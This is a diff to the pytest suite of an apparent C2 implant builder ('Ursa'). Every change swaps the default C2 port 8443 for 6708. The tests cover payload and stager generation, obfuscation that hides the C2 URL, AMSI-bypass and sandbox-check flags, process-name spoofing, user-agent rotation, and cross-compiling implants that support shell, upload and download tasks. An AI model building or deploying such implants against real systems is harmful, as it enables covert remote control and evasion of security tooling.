@@ -47,7 +47,7 @@ def builder(tmp_templates: Path) -> Builder:
 @pytest.fixture()
 def config() -> PayloadConfig:
     return PayloadConfig(
-        c2_url="http://10.0.0.1:8443",
+        c2_url="http://10.0.0.1:6708",
         interval=10,
         jitter=0.2,
         template="basic",
@@ -59,21 +59,21 @@ def config() -> PayloadConfig:
 
 class TestPayloadConfig:
     def test_tokens_defaults(self):
-        cfg = PayloadConfig(c2_url="http://1.2.3.4:8443")
+        cfg = PayloadConfig(c2_url="http://1.2.3.4:6708")
         tokens = cfg.tokens()
-        assert tokens["URSA_C2_URL"] == "http://1.2.3.4:8443"
+        assert tokens["URSA_C2_URL"] == "http://1.2.3.4:6708"
         assert tokens["URSA_INTERVAL"] == "5"
         assert tokens["URSA_JITTER"] == "0.3"
 
     def test_tokens_custom_values(self, config: PayloadConfig):
         tokens = config.tokens()
-        assert tokens["URSA_C2_URL"] == "http://10.0.0.1:8443"
+        assert tokens["URSA_C2_URL"] == "http://10.0.0.1:6708"
         assert tokens["URSA_INTERVAL"] == "10"
         assert tokens["URSA_JITTER"] == "0.2"
 
     def test_extra_tokens_included(self):
         cfg = PayloadConfig(
-            c2_url="http://1.2.3.4:8443",
+            c2_url="http://1.2.3.4:6708",
             extra_tokens={"URSA_CUSTOM": "hello"},
         )
         assert cfg.tokens()["URSA_CUSTOM"] == "hello"
@@ -115,7 +115,7 @@ class TestListTemplates:
 class TestBuild:
     def test_substitutes_c2_url(self, builder: Builder, config: PayloadConfig):
         source = builder.build(config)
-        assert "http://10.0.0.1:8443" in source
+        assert "http://10.0.0.1:6708" in source
         assert "URSA_C2_URL" not in source
 
     def test_substitutes_interval(self, builder: Builder, config: PayloadConfig):
@@ -133,7 +133,7 @@ class TestBuild:
             assert token not in source
 
     def test_missing_template_raises(self, builder: Builder):
-        cfg = PayloadConfig(c2_url="http://1.2.3.4:8443", template="doesnotexist")
+        cfg = PayloadConfig(c2_url="http://1.2.3.4:6708", template="doesnotexist")
         with pytest.raises(FileNotFoundError, match="doesnotexist"):
             builder.build(cfg)
 
@@ -141,7 +141,7 @@ class TestBuild:
         (tmp_templates / "custom.py").write_text("KEY = 'URSA_MYKEY'\n")
         b = Builder(templates_dir=tmp_templates)
         cfg = PayloadConfig(
-            c2_url="http://1.2.3.4:8443",
+            c2_url="http://1.2.3.4:6708",
             template="custom",
             extra_tokens={"URSA_MYKEY": "secret123"},
         )
@@ -164,11 +164,11 @@ class TestBuildStager:
         orig = bmod.STAGER_PATH
         bmod.STAGER_PATH = stager
         try:
-            source = Builder().build_stager("http://10.0.0.1:8443")
+            source = Builder().build_stager("http://10.0.0.1:6708")
         finally:
             bmod.STAGER_PATH = orig
 
-        assert "http://10.0.0.1:8443" in source
+        assert "http://10.0.0.1:6708" in source
         assert "URSA_C2_URL" not in source
 
     def test_missing_stager_raises(self, tmp_path: Path):
@@ -177,7 +177,7 @@ class TestBuildStager:
         bmod.STAGER_PATH = tmp_path / "nonexistent.py"
         try:
             with pytest.raises(FileNotFoundError):
-                Builder().build_stager("http://1.2.3.4:8443")
+                Builder().build_stager("http://1.2.3.4:6708")
         finally:
             bmod.STAGER_PATH = orig
 
@@ -200,7 +200,7 @@ class TestWrite:
         out = tmp_path / "out.py"
         result = builder.build_to_file(config, out)
         assert result == out
-        assert "http://10.0.0.1:8443" in out.read_text()
+        assert "http://10.0.0.1:6708" in out.read_text()
 
 
 # ── Helpers ───────────────────────────────────────────────────────────────────
@@ -219,7 +219,7 @@ class TestHelpers:
 
     def test_auto_c2_url_default_port(self):
         url = auto_c2_url()
-        assert ":8443" in url
+        assert ":6708" in url
 
 
 # ── real http_python template ─────────────────────────────────────────────────
@@ -232,7 +232,7 @@ class TestRealTemplate:
         b = Builder()  # uses default templates dir
         if "http_python" not in b.list_templates():
             pytest.skip("http_python template not present")
-        cfg = PayloadConfig(c2_url="http://192.168.1.1:8443", template="http_python")
+        cfg = PayloadConfig(c2_url="http://192.168.1.1:6708", template="http_python")
         source = b.build(cfg)
         assert "192.168.1.1" in source
         assert "URSA_C2_URL" not in source
@@ -271,9 +271,9 @@ class TestMultiExtension:
 
     def test_builds_zig_template(self, tmp_templates_multi: Path):
         b = Builder(templates_dir=tmp_templates_multi)
-        cfg = PayloadConfig(c2_url="http://10.0.0.1:8443", template="http_zig")
+        cfg = PayloadConfig(c2_url="http://10.0.0.1:6708", template="http_zig")
         source = b.build(cfg)
-        assert "http://10.0.0.1:8443" in source
+        assert "http://10.0.0.1:6708" in source
         assert "URSA_C2_URL" not in source
         assert "URSA_INTERVAL" not in source
         assert "URSA_JITTER" not in source
@@ -289,17 +289,17 @@ class TestMultiExtension:
 
 class TestPostBuild:
     def test_default_is_empty(self):
-        cfg = PayloadConfig(c2_url="http://1.2.3.4:8443")
+        cfg = PayloadConfig(c2_url="http://1.2.3.4:6708")
         assert cfg.post_build == ""
 
     def test_custom_post_build_stored(self):
         cmd = "zig build-exe {output} -femit-bin={binary}"
-        cfg = PayloadConfig(c2_url="http://1.2.3.4:8443", post_build=cmd)
+        cfg = PayloadConfig(c2_url="http://1.2.3.4:6708", post_build=cmd)
         assert cfg.post_build == cmd
 
     def test_post_build_not_in_tokens(self):
         cfg = PayloadConfig(
-            c2_url="http://1.2.3.4:8443",
+            c2_url="http://1.2.3.4:6708",
             post_build="zig build-exe {output}",
         )
         assert "post_build" not in cfg.tokens()
@@ -310,7 +310,7 @@ class TestPostBuild:
 
 class TestCompile:
     def test_returns_none_when_no_post_build(self, tmp_path: Path):
-        cfg = PayloadConfig(c2_url="http://1.2.3.4:8443")
+        cfg = PayloadConfig(c2_url="http://1.2.3.4:6708")
         result = Builder().compile(cfg, tmp_path / "agent.zig")
         assert result is None
 
@@ -318,7 +318,7 @@ class TestCompile:
         src = tmp_path / "agent.zig"
         src.write_text("// stub\n")
         cfg = PayloadConfig(
-            c2_url="http://1.2.3.4:8443",
+            c2_url="http://1.2.3.4:6708",
             post_build="echo {output}",
         )
         with patch("subprocess.run") as mock_run:
@@ -330,7 +330,7 @@ class TestCompile:
         src = tmp_path / "agent.zig"
         src.write_text("// stub\n")
         cfg = PayloadConfig(
-            c2_url="http://1.2.3.4:8443",
+            c2_url="http://1.2.3.4:6708",
             post_build="false",  # always exits 1
         )
         with patch("subprocess.run") as mock_run:
@@ -342,7 +342,7 @@ class TestCompile:
         src = tmp_path / "payload.zig"
         src.write_text("// stub\n")
         cfg = PayloadConfig(
-            c2_url="http://1.2.3.4:8443",
+            c2_url="http://1.2.3.4:6708",
             post_build="mycc {output} -o {binary}",
         )
         with patch("subprocess.run") as mock_run:
@@ -359,14 +359,14 @@ class TestCompile:
 class TestBuildAndCompile:
     def test_returns_source_path(self, tmp_templates: Path, tmp_path: Path):
         out = tmp_path / "payload.py"
-        cfg = PayloadConfig(c2_url="http://1.2.3.4:8443", template="basic")
+        cfg = PayloadConfig(c2_url="http://1.2.3.4:6708", template="basic")
         src, _bin = Builder(templates_dir=tmp_templates).build_and_compile(cfg, out)
         assert src == out
         assert out.exists()
 
     def test_binary_none_when_no_post_build(self, tmp_templates: Path, tmp_path: Path):
         out = tmp_path / "payload.py"
-        cfg = PayloadConfig(c2_url="http://1.2.3.4:8443", template="basic")
+        cfg = PayloadConfig(c2_url="http://1.2.3.4:6708", template="basic")
         _src, binary = Builder(templates_dir=tmp_templates).build_and_compile(cfg, out)
         assert binary is None
 
@@ -375,7 +375,7 @@ class TestBuildAndCompile:
     ):
         out = tmp_path / "agent.zig"
         cfg = PayloadConfig(
-            c2_url="http://1.2.3.4:8443",
+            c2_url="http://1.2.3.4:6708",
             template="basic",
             post_build="echo {output}",
         )
@@ -397,7 +397,7 @@ class TestRealZigTemplate:
         b = Builder()
         if "http_zig" not in b.list_templates():
             pytest.skip("http_zig template not present")
-        cfg = PayloadConfig(c2_url="http://192.168.1.1:8443", template="http_zig")
+        cfg = PayloadConfig(c2_url="http://192.168.1.1:6708", template="http_zig")
         source = b.build(cfg)
         assert "192.168.1.1" in source
         assert "URSA_C2_URL" not in source
@@ -409,7 +409,7 @@ class TestRealZigTemplate:
         if "http_zig" not in b.list_templates():
             pytest.skip("http_zig template not present")
         cfg = PayloadConfig(
-            c2_url="http://1.2.3.4:8443", template="http_zig", interval=15
+            c2_url="http://1.2.3.4:6708", template="http_zig", interval=15
         )
         source = b.build(cfg)
         assert "15" in source
@@ -429,11 +429,11 @@ class TestObfuscation:
     """Tests for Builder._obfuscate() and PayloadConfig.obfuscate flag."""
 
     def test_obfuscate_flag_default_false(self):
-        cfg = PayloadConfig(c2_url="http://1.2.3.4:8443")
+        cfg = PayloadConfig(c2_url="http://1.2.3.4:6708")
         assert cfg.obfuscate is False
 
     def test_obfuscate_flag_can_be_set(self):
-        cfg = PayloadConfig(c2_url="http://1.2.3.4:8443", obfuscate=True)
+        cfg = PayloadConfig(c2_url="http://1.2.3.4:6708", obfuscate=True)
         assert cfg.obfuscate is True
 
     def test_obfuscate_output_is_string(self):
@@ -442,14 +442,14 @@ class TestObfuscation:
         assert isinstance(result, str)
 
     def test_obfuscate_output_differs_from_input(self):
-        source = 'C2 = "http://10.0.0.1:8443"\n'
+        source = 'C2 = "http://10.0.0.1:6708"\n'
         result = Builder._obfuscate(source)
         assert result != source
 
     def test_obfuscate_hides_c2_url(self):
-        source = 'C2_URL = "http://10.0.0.1:8443"\n'
+        source = 'C2_URL = "http://10.0.0.1:6708"\n'
         result = Builder._obfuscate(source)
-        assert "http://10.0.0.1:8443" not in result
+        assert "http://10.0.0.1:6708" not in result
 
     def test_obfuscate_output_is_valid_python(self):
         source = 'x = 1 + 1\n'
@@ -472,22 +472,22 @@ class TestObfuscation:
         assert stub1 != stub2
 
     def test_build_without_obfuscate_contains_c2_url(self, tmp_templates, builder):
-        cfg = PayloadConfig(c2_url="http://10.0.0.1:8443", template="basic", obfuscate=False)
+        cfg = PayloadConfig(c2_url="http://10.0.0.1:6708", template="basic", obfuscate=False)
         source = builder.build(cfg)
-        assert "http://10.0.0.1:8443" in source
+        assert "http://10.0.0.1:6708" in source
 
     def test_build_with_obfuscate_hides_c2_url(self, tmp_templates, builder):
-        cfg = PayloadConfig(c2_url="http://10.0.0.1:8443", template="basic", obfuscate=True)
+        cfg = PayloadConfig(c2_url="http://10.0.0.1:6708", template="basic", obfuscate=True)
         source = builder.build(cfg)
-        assert "http://10.0.0.1:8443" not in source
+        assert "http://10.0.0.1:6708" not in source
 
     def test_build_with_obfuscate_exec_works(self, tmp_templates, builder):
-        cfg = PayloadConfig(c2_url="http://10.0.0.1:8443", template="basic", obfuscate=True)
+        cfg = PayloadConfig(c2_url="http://10.0.0.1:6708", template="basic", obfuscate=True)
         stub = builder.build(cfg)
-        # The template sets C2 = "http://10.0.0.1:8443" — exec and verify
+        # The template sets C2 = "http://10.0.0.1:6708" — exec and verify
         ns: dict = {}
         exec(stub, ns)
-        assert ns.get("C2") == "http://10.0.0.1:8443"
+        assert ns.get("C2") == "http://10.0.0.1:6708"
 
 
 # ── Beacon UA rotation ─────────────────────────────────────────────────────────
@@ -506,7 +506,7 @@ class TestBeaconUARotation:
 
     def test_beacon_picks_ua_from_pool(self):
         from implants.beacon import UrsaBeacon, _USER_AGENTS
-        b = UrsaBeacon("http://127.0.0.1:8443", sandbox_check=False)
+        b = UrsaBeacon("http://127.0.0.1:6708", sandbox_check=False)
         assert b.user_agent in _USER_AGENTS
 
     def test_different_instances_may_pick_different_uas(self):
@@ -514,7 +514,7 @@ class TestBeaconUARotation:
         # With 7 choices, chance all 10 picks are the same is (1/7)^9 ≈ negligible
         if len(_USER_AGENTS) < 2:
             pytest.skip("Only one UA in pool")
-        uas = {UrsaBeacon("http://127.0.0.1:8443", sandbox_check=False).user_agent
+        uas = {UrsaBeacon("http://127.0.0.1:6708", sandbox_check=False).user_agent
                for _ in range(20)}
         assert len(uas) > 1
 
@@ -525,17 +525,17 @@ class TestBeaconUARotation:
 class TestBeaconJitter:
     def test_jitter_clamped_to_valid_range(self):
         from implants.beacon import UrsaBeacon
-        b = UrsaBeacon("http://127.0.0.1:8443", jitter=5.0, sandbox_check=False)
+        b = UrsaBeacon("http://127.0.0.1:6708", jitter=5.0, sandbox_check=False)
         assert 0.0 <= b.jitter <= 1.0
 
     def test_jitter_negative_clamped_to_zero(self):
         from implants.beacon import UrsaBeacon
-        b = UrsaBeacon("http://127.0.0.1:8443", jitter=-1.0, sandbox_check=False)
+        b = UrsaBeacon("http://127.0.0.1:6708", jitter=-1.0, sandbox_check=False)
         assert b.jitter == 0.0
 
     def test_default_jitter_is_0_3(self):
         from implants.beacon import UrsaBeacon
-        b = UrsaBeacon("http://127.0.0.1:8443", sandbox_check=False)
+        b = UrsaBeacon("http://127.0.0.1:6708", sandbox_check=False)
         assert b.jitter == 0.3
 
     def test_jitter_sleep_stays_above_minimum(self):
@@ -543,7 +543,7 @@ class TestBeaconJitter:
         import unittest.mock as mock
         from implants import beacon as beacon_mod
         from implants.beacon import UrsaBeacon
-        b = UrsaBeacon("http://127.0.0.1:8443", interval=1, jitter=0.9,
+        b = UrsaBeacon("http://127.0.0.1:6708", interval=1, jitter=0.9,
                         sandbox_check=False, amsi_bypass=False)
         sleep_calls = []
         with mock.patch.object(beacon_mod, "_obfuscated_sleep",
@@ -560,7 +560,7 @@ class TestBeaconProcessName:
     def test_no_process_name_no_crash(self):
         """Default (empty) process_name should not call spoof."""
         from implants.beacon import UrsaBeacon
-        b = UrsaBeacon("http://127.0.0.1:8443", sandbox_check=False)
+        b = UrsaBeacon("http://127.0.0.1:6708", sandbox_check=False)
         # Just checking it constructs cleanly
         assert b is not None
 
@@ -569,7 +569,7 @@ class TestBeaconProcessName:
         import sys
         from implants.beacon import UrsaBeacon
         original = sys.argv[0]
-        UrsaBeacon("http://127.0.0.1:8443", sandbox_check=False,
+        UrsaBeacon("http://127.0.0.1:6708", sandbox_check=False,
                    process_name="fake-process")
         assert sys.argv[0] == "fake-process"
         sys.argv[0] = original  # restore
@@ -579,7 +579,7 @@ class TestBeaconProcessName:
         import sys
         from implants.beacon import UrsaBeacon
         original = sys.argv[0]
-        UrsaBeacon("http://127.0.0.1:8443", sandbox_check=False, process_name="")
+        UrsaBeacon("http://127.0.0.1:6708", sandbox_check=False, process_name="")
         assert sys.argv[0] == original
 
 
@@ -601,7 +601,7 @@ class TestGoTemplate:
 
     def test_go_template_builds(self):
         from implants.builder import Builder, PayloadConfig
-        cfg = PayloadConfig(c2_url="http://127.0.0.1:8443", template="http_go")
+        cfg = PayloadConfig(c2_url="http://127.0.0.1:6708", template="http_go")
         src = Builder().build(cfg)
         assert isinstance(src, str)
         assert len(src) > 100
@@ -615,7 +615,7 @@ class TestGoTemplate:
 
     def test_go_template_substitutes_interval(self):
         from implants.builder import Builder, PayloadConfig
-        cfg = PayloadConfig(c2_url="http://127.0.0.1:8443", interval=30,
+        cfg = PayloadConfig(c2_url="http://127.0.0.1:6708", interval=30,
                             template="http_go")
         src = Builder().build(cfg)
         assert "URSA_INTERVAL" not in src
@@ -623,7 +623,7 @@ class TestGoTemplate:
 
     def test_go_template_substitutes_jitter(self):
         from implants.builder import Builder, PayloadConfig
-        cfg = PayloadConfig(c2_url="http://127.0.0.1:8443", jitter=0.5,
+        cfg = PayloadConfig(c2_url="http://127.0.0.1:6708", jitter=0.5,
                             template="http_go")
         src = Builder().build(cfg)
         assert "URSA_JITTER" not in src
@@ -631,14 +631,14 @@ class TestGoTemplate:
 
     def test_go_template_is_valid_go_package(self):
         from implants.builder import Builder, PayloadConfig
-        cfg = PayloadConfig(c2_url="http://127.0.0.1:8443", template="http_go")
+        cfg = PayloadConfig(c2_url="http://127.0.0.1:6708", template="http_go")
         src = Builder().build(cfg)
         assert "package main" in src
         assert "func main()" in src
 
     def test_go_template_has_all_task_types(self):
         from implants.builder import Builder, PayloadConfig
-        cfg = PayloadConfig(c2_url="http://127.0.0.1:8443", template="http_go")
+        cfg = PayloadConfig(c2_url="http://127.0.0.1:6708", template="http_go")
         src = Builder().build(cfg)
         for task in ("shell", "sysinfo", "ps", "whoami", "pwd", "cd",
                      "ls", "env", "download", "upload", "sleep", "kill"):
@@ -646,14 +646,14 @@ class TestGoTemplate:
 
     def test_go_template_has_ua_pool(self):
         from implants.builder import Builder, PayloadConfig
-        cfg = PayloadConfig(c2_url="http://127.0.0.1:8443", template="http_go")
+        cfg = PayloadConfig(c2_url="http://127.0.0.1:6708", template="http_go")
         src = Builder().build(cfg)
         assert "Mozilla" in src
         assert "userAgents" in src
 
     def test_go_template_has_jitter_sleep(self):
         from implants.builder import Builder, PayloadConfig
-        cfg = PayloadConfig(c2_url="http://127.0.0.1:8443", template="http_go")
+        cfg = PayloadConfig(c2_url="http://127.0.0.1:6708", template="http_go")
         src = Builder().build(cfg)
         assert "jitterSleep" in src
 
@@ -666,7 +666,7 @@ class TestGoTemplate:
         import subprocess
         from implants.builder import Builder, PayloadConfig
         cfg = PayloadConfig(
-            c2_url="http://127.0.0.1:8443",
+            c2_url="http://127.0.0.1:6708",
             template="http_go",
             post_build="go build -o {binary} {output}",
         )
@@ -690,7 +690,7 @@ class TestGoTemplate:
         """Cross-compile for Linux/amd64 from any host."""
         import subprocess
         from implants.builder import Builder, PayloadConfig
-        cfg = PayloadConfig(c2_url="http://127.0.0.1:8443", template="http_go")
+        cfg = PayloadConfig(c2_url="http://127.0.0.1:6708", template="http_go")
         src_path = Builder().build_to_file(cfg, tmp_path / "agent.go")
         env = {**__import__("os").environ, "GOOS": "linux", "GOARCH": "amd64"}
         result = subprocess.run(
@@ -721,7 +721,7 @@ class TestGoTemplateCrossCompile:
     def test_cross_compiles_windows_amd64(self, tmp_path):
         """Cross-compile for Windows/amd64."""
         import os
-        cfg = PayloadConfig(c2_url="http://127.0.0.1:8443", template="http_go")
+        cfg = PayloadConfig(c2_url="http://127.0.0.1:6708", template="http_go")
         src_path = Builder().build_to_file(cfg, tmp_path / "agent.go")
         env = {**os.environ, "GOOS": "windows", "GOARCH": "amd64"}
         result = subprocess.run(
@@ -740,7 +740,7 @@ class TestGoTemplateCrossCompile:
     def test_cross_compiles_darwin_arm64(self, tmp_path):
         """Cross-compile for macOS/arm64."""
         import os
-        cfg = PayloadConfig(c2_url="http://127.0.0.1:8443", template="http_go")
+        cfg = PayloadConfig(c2_url="http://127.0.0.1:6708", template="http_go")
         src_path = Builder().build_to_file(cfg, tmp_path / "agent.go")
         env = {**os.environ, "GOOS": "darwin", "GOARCH": "arm64"}
         result = subprocess.run(
@@ -759,7 +759,7 @@ class TestGoTemplateCrossCompile:
     def test_build_and_compile_via_builder_api(self, tmp_path):
         """Use Builder.build_and_compile() end-to-end with go build."""
         cfg = PayloadConfig(
-            c2_url="http://127.0.0.1:8443",
+            c2_url="http://127.0.0.1:6708",
             template="http_go",
             post_build="go build -o {binary} {output}",
         )
@@ -868,7 +868,7 @@ class TestRealZigTemplateStructure:
             pytest.skip("http_zig template not present")
 
     def _src(self, **kw) -> str:
-        cfg = PayloadConfig(c2_url="http://127.0.0.1:8443", template="http_zig", **kw)
+        cfg = PayloadConfig(c2_url="http://127.0.0.1:6708", template="http_zig", **kw)
         return Builder().build(cfg)
 
     def test_imports_std(self):
@@ -915,7 +915,7 @@ class TestRealZigTemplateStructure:
     )
     def test_compiles_with_zig(self, tmp_path):
         """Template compiles cleanly; @panic stubs are valid Zig (runtime, not compile-time)."""
-        cfg = PayloadConfig(c2_url="http://127.0.0.1:8443", template="http_zig")
+        cfg = PayloadConfig(c2_url="http://127.0.0.1:6708", template="http_zig")
         src_path = Builder().build_to_file(cfg, tmp_path / "agent.zig")
         result = subprocess.run(
             ["zig", "build-exe", str(src_path), f"-femit-bin={tmp_path / 'agent'}"],
@@ -963,14 +963,14 @@ class TestCLI:
         import implants.builder as bmod
         monkeypatch.setattr(bmod, "TEMPLATES_DIR", tmp_templates)
         from implants.builder import main
-        main(["build", "--c2", "http://1.2.3.4:8443", "--template", "basic"])
-        assert "http://1.2.3.4:8443" in capsys.readouterr().out
+        main(["build", "--c2", "http://1.2.3.4:6708", "--template", "basic"])
+        assert "http://1.2.3.4:6708" in capsys.readouterr().out
 
     def test_build_stdout_no_tokens_remain(self, tmp_templates, monkeypatch, capsys):
         import implants.builder as bmod
         monkeypatch.setattr(bmod, "TEMPLATES_DIR", tmp_templates)
         from implants.builder import main
-        main(["build", "--c2", "http://1.2.3.4:8443", "--template", "basic"])
+        main(["build", "--c2", "http://1.2.3.4:6708", "--template", "basic"])
         out = capsys.readouterr().out
         for tok in ("URSA_C2_URL", "URSA_INTERVAL", "URSA_JITTER"):
             assert tok not in out
@@ -979,7 +979,7 @@ class TestCLI:
         import implants.builder as bmod
         monkeypatch.setattr(bmod, "TEMPLATES_DIR", tmp_templates)
         from implants.builder import main
-        main(["build", "--c2", "http://1.2.3.4:8443", "--template", "basic",
+        main(["build", "--c2", "http://1.2.3.4:6708", "--template", "basic",
               "--interval", "42"])
         assert "42" in capsys.readouterr().out
 
@@ -987,22 +987,22 @@ class TestCLI:
         import implants.builder as bmod
         monkeypatch.setattr(bmod, "TEMPLATES_DIR", tmp_templates)
         from implants.builder import main
-        main(["build", "--c2", "http://1.2.3.4:8443", "--template", "basic",
+        main(["build", "--c2", "http://1.2.3.4:6708", "--template", "basic",
               "--jitter", "0.7"])
         assert "0.7" in capsys.readouterr().out
 
     def test_build_auto_detects_c2_url_when_omitted(self, tmp_templates, monkeypatch, capsys):
         import implants.builder as bmod
         monkeypatch.setattr(bmod, "TEMPLATES_DIR", tmp_templates)
-        monkeypatch.setattr(bmod, "auto_c2_url", lambda: "http://AUTO:8443")
+        monkeypatch.setattr(bmod, "auto_c2_url", lambda: "http://AUTO:6708")
         from implants.builder import main
         main(["build", "--template", "basic"])
-        assert "http://AUTO:8443" in capsys.readouterr().out
+        assert "http://AUTO:6708" in capsys.readouterr().out
 
     def test_build_missing_template_exits_1(self, capsys):
         from implants.builder import main
         with pytest.raises(SystemExit) as exc:
-            main(["build", "--c2", "http://1.2.3.4:8443", "--template", "GHOST"])
+            main(["build", "--c2", "http://1.2.3.4:6708", "--template", "GHOST"])
         assert exc.value.code == 1
 
     # -- build subcommand (--output) --
@@ -1012,17 +1012,17 @@ class TestCLI:
         monkeypatch.setattr(bmod, "TEMPLATES_DIR", tmp_templates)
         out_file = tmp_path / "payload.py"
         from implants.builder import main
-        main(["build", "--c2", "http://5.6.7.8:8443", "--template", "basic",
+        main(["build", "--c2", "http://5.6.7.8:6708", "--template", "basic",
               "--output", str(out_file)])
         assert out_file.exists()
-        assert "http://5.6.7.8:8443" in out_file.read_text()
+        assert "http://5.6.7.8:6708" in out_file.read_text()
 
     def test_build_to_file_prints_source_path(self, tmp_templates, tmp_path, monkeypatch, capsys):
         import implants.builder as bmod
         monkeypatch.setattr(bmod, "TEMPLATES_DIR", tmp_templates)
         out_file = tmp_path / "payload.py"
         from implants.builder import main
-        main(["build", "--c2", "http://1.2.3.4:8443", "--template", "basic",
+        main(["build", "--c2", "http://1.2.3.4:6708", "--template", "basic",
               "--output", str(out_file)])
         assert "Source written to" in capsys.readouterr().out
 
@@ -1035,7 +1035,7 @@ class TestCLI:
         from implants.builder import main
         with patch("subprocess.run") as mock_run:
             mock_run.return_value = None
-            main(["build", "--c2", "http://1.2.3.4:8443", "--template", "basic",
+            main(["build", "--c2", "http://1.2.3.4:6708", "--template", "basic",
                   "--output", str(out_file), "--post-build", "echo {output}"])
         assert mock_run.called
         assert "Binary:" in capsys.readouterr().out
@@ -1050,7 +1050,7 @@ class TestCLI:
         with patch("subprocess.run") as mock_run:
             mock_run.side_effect = subprocess.CalledProcessError(1, ["false"])
             with pytest.raises(SystemExit) as exc:
-                main(["build", "--c2", "http://1.2.3.4:8443", "--template", "basic",
+                main(["build", "--c2", "http://1.2.3.4:6708", "--template", "basic",
                       "--output", str(out_file), "--post-build", "false"])
         assert exc.value.code == 1
 
@@ -1062,8 +1062,8 @@ class TestCLI:
         stager.write_text('C2 = "URSA_C2_URL"\n')
         monkeypatch.setattr(bmod, "STAGER_PATH", stager)
         from implants.builder import main
-        main(["stager", "--c2", "http://9.9.9.9:8443"])
-        assert "http://9.9.9.9:8443" in capsys.readouterr().out
+        main(["stager", "--c2", "http://9.9.9.9:6708"])
+        assert "http://9.9.9.9:6708" in capsys.readouterr().out
 
     def test_stager_writes_to_file(self, tmp_path, monkeypatch, capsys):
         import implants.builder as bmod
@@ -1072,15 +1072,15 @@ class TestCLI:
         monkeypatch.setattr(bmod, "STAGER_PATH", stager)
         out_file = tmp_path / "out_stager.py"
         from implants.builder import main
-        main(["stager", "--c2", "http://9.9.9.9:8443", "--output", str(out_file)])
-        assert "http://9.9.9.9:8443" in out_file.read_text()
+        main(["stager", "--c2", "http://9.9.9.9:6708", "--output", str(out_file)])
+        assert "http://9.9.9.9:6708" in out_file.read_text()
 
     def test_stager_missing_exits_1(self, tmp_path, monkeypatch, capsys):
         import implants.builder as bmod
         monkeypatch.setattr(bmod, "STAGER_PATH", tmp_path / "no_such.py")
         from implants.builder import main
         with pytest.raises(SystemExit) as exc:
-            main(["stager", "--c2", "http://1.2.3.4:8443"])
+            main(["stager", "--c2", "http://1.2.3.4:6708"])
         assert exc.value.code == 1
 
     def test_stager_auto_detects_c2_url_when_omitted(self, tmp_path, monkeypatch, capsys):
@@ -1088,7 +1088,7 @@ class TestCLI:
         stager = tmp_path / "stager.py"
         stager.write_text('C2 = "URSA_C2_URL"\n')
         monkeypatch.setattr(bmod, "STAGER_PATH", stager)
-        monkeypatch.setattr(bmod, "auto_c2_url", lambda: "http://STAGER_AUTO:8443")
+        monkeypatch.setattr(bmod, "auto_c2_url", lambda: "http://STAGER_AUTO:6708")
         from implants.builder import main
         main(["stager"])
-        assert "http://STAGER_AUTO:8443" in capsys.readouterr().out
+        assert "http://STAGER_AUTO:6708" in capsys.readouterr().out
